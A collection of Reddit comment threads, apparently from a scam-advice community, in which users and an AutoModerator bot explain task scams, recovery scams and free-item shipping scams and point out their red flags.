- No, all of it is your fault for being greedy. Why/how did you think you'd legitimately get a $2k GPU for 75 dollars, off of TikTok no less?
- Potentially fraudulent? Lol
- buying a memory card holder for 15 yuan ($2 USD) is different than buying a graphics card that retails for over $2,000 for $81... you see this, yes?
- I never said that TikTok can't be used to buy things.  Just that 99% of the time it'll be a scam.
- Fast durability? What?
- Buying off Tik Tok is ridiculous. There are plenty of other sites you can safely buy off of using appropriate secure methods. I wouldn't trust that app with my life. Or any app for that matter...
- Can I send you a cashiers check?
- They *got* money for getting kicked in the balls. OP *paid* money for a virtual kick in the balls. No idea which hurts more.
- No, I sent money to TikTok, which then sent that money to the ‚Äúscammer‚Äù after the package arrived if I even got one (obviously not), and my money is being processed to be refunded.
- Op is closing the barn door after the horse ripped him off for $75.
- He is joking. Not?
- But yet you‚Äôre on this app‚Ä¶.. maybe you shouldn‚Äôt use any internet if you don‚Äôt trust any of it.
- Would you take an out of state, two party, bad check?
- What a stupid comment. Being on here has nothing to do with buying crap off shady websites from shady people.
- First you need to pay a refundable shipping insurance fee.
- You just keep contradicting yourself just stop replying. You‚Äôre wasting your own time.

- It's a !task scam. Two pieces of advice:

1) block the scammers without saying goodbye, and
2) punctuation.
- Which part of "you have to give them more and more money" sounds too **good** to be true?
- Next time be mindful of all of the red flags of a scam job just in your description alone that you missed:

- being randomly approached through WhatsApp or text with a job offer

- the job being super brain dead easy, with super flexible hours, offering high pay

- the job pays in crypto

- having to deposit your own money (never pay to get paid)

Any money you gave them is gone unfortunately, and no one can get it back for you. You may be getting DMs from random people who claim to be someone or know someone who can use hacking magic to get it back, but they‚Äôre just !recovery scammers.
- I only had to read to see it was a job offer on Whatsapp. 

It's a scam if:

It's on Whatsapp or telegram.
It's a well paying remote job.
It requires very little actual work.
It requires a crypto wallet.
It requires you to pay money to actually get your money out.
- Hi /u/YourUsernameForever, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

- Damn:(
- Hi /u/Applauce, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.


**
- Fyi, people have little patience with this type of scam in this subreddit because we see it like MULTIPLE TIMES PER DAY.

It‚Äôs wearying.

Common sense is‚Ä¶not common at all these days‚Ä¶
- Any money you sent them is GONE FOREVER. Read the recovery scam bot posted earlier.

Title: Can‚Äôt tell if this camera listing is a scam.
Body: There is a camera listing on Facebook for free, all that‚Äôs needed is the shipping cost payment. The guy claims he used the camera for a project once and doesn‚Äôt need it anymore. Just can‚Äôt tell why he would give it away for free as it goes for $500-$1,000. He wants to use Apple Pay and has sent me photos but they are kind of blurry. He sent a video of the camera and seems legit but I just can‚Äôt understand why he would give it away for free. The shipping is $64. Please any advice would be appreciated!

- !ps5 (the item doesn't matter, same scam)
- Very much a scam. After you send $64, oops turns out a few more bucks are needed for some BS reason like it was heavier than expected‚Ä¶.insurance fee. Oh it turns out he‚Äôs actually outside the us for the moment so please pay a customs fee. Darn, silly him he only provided a partial address, now the courier needs to verify your address and identity‚Ä¶a credit card is needed to verify. It goes on and on.
- SCAM! The entire reason you use fb mkpl is so you can meet in person, verify that what is being bought is legit and works, and can exchange cash.

Shipping is always a scam. Free camera is a scam. They want the $64 shipping. That shipping is way too high to start with even if it was real, but it isn't. Once they get your money they will disappear.
- facebook/ebay/somedudeontheweb

lots of scams....

i get used camera gear from MPB or Canon USA Refurbished
- It‚Äôs a common scam.

I bet if you asked for his address for pickup and said you live nearby he would then have some other idea for you to give money first .. like give me $40 and I will hold until you pick up.

There is no camera, it‚Äôs a scam.
- Sounds like a scam to me. 

Why would someone give away a camera worth $500‚Äì$1,000 for free? The blurry photos and push for shipping payment are big red flags. If you send the $64, they might come back with more excuses, like extra fees or customs charges.

A real seller wouldn‚Äôt mind meeting up or letting you pick it up. I‚Äôd stay away from this deal‚Äîit‚Äôs not worth the risk!
- Thanks for the reply!
- Hi /u/Otherwise_Rabbit3049, AutoModerator has been summoned to explain the Free PS5 or free Macbook scam.

This scam consists of an offer of a free video game console, a free laptop or otherwise expensive electronics posted on social media or classifieds platforms, usually on Facebook Marketplace. The scammer sometimes plays the role of a parent who lost their child, a parent who is punishing their child, or someone offering the console as a giveaway. When offering a free laptop, it's always a giveaway for students in need.

The scammer offers the item for free, and asks only to cover the shipping costs. Once you pay for the shipping, the scammer disappears with your money.
